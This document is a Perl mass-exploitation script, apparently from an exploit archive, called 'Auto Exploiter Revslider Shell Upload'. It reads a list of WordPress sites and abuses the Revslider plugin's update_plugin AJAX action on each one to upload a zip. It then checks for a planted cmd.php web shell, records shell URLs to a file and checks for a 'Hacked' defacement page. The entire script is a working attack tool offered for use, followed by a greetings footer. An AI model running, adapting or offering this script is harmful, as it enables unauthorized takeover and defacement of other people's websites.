#!/usr/bin/perl
 
use LWP::UserAgent;
 
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
 
head();
 
my $usage = " \nperl $0 <list.txt>\n perl $0 list.txt";
die "$usage" unless $ARGV[0];
 
open(tarrget,"<$ARGV[0]") or die "$!";
while(<tarrget>){
chomp($_);
$target = $_;
 
my $path = "wp-admin/admin-ajax.php";
 
print "\nTarget => $target\n";
 
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $req = $ua->get("$target/$path");
if($req->is_success) {
print "\n  [+] Xploit Possibility Work :3\n \n";
 
 
 
print "  [*] Try Exploiting Vulnerability\n";
print "  [*] Xploiting $target\n";
 
my $exploit = $ua->post("$target/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["revslider.zip"]]);
 
print "  [*] Sent payload\n";
 
if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
print "  [+] Payload successfully executed\n";
 
print "  [*] Checking if shell was uploaded\n";
my $check = $ua->get("$target/wp-content/plugins/revslider/temp/update_extract/revslider/cmd.php")->content;
if($check =~/<br>/) {
 
    print "  [+] Shell successfully uploaded\n";
    open(save, '>>Shell.txt');
    print save "shell : $target/wp-content/plugins/revslider/temp/update_extract/revslider/cmd.php?zeb\n";
    close(save);
 
 
print "  [*] Checking if Deface was uploaded now\n";
 
my $def = $ua->get("$target/leet.html")->content;
if($def = ~/Hacked/) {
 
print "  [+] Deface uploaded successfull\n";
 
 
} else {print "   [-] Deface not Uploaded :/"; }
} else { print "  [-] I'think Shell Not Uploaded :/\n"; }
} else {
print "  [-] Payload failed: Fail\n";
print "\n";
 
}
} else { print "\n [-]Xploit Fail \n"}
 
sub head {
print "\t   +===============================================\n";
print "\t   | Auto Exploiter Revslider Shell Upload \n";
print "\t   | Edited: indoushka\n";
print "\t   +===============================================\n";
}
}

Greetings to :=========================================================================================================================
                                                                                                                                      |
jericho * Larry W. Cashdollar * brutelogic* hyp3rlinx* 9aylas * shadow_00715 * LiquidWorm * thelastvvv *Zigoo.eg                      |
                                                                                                                                      |
======================================================================================================================================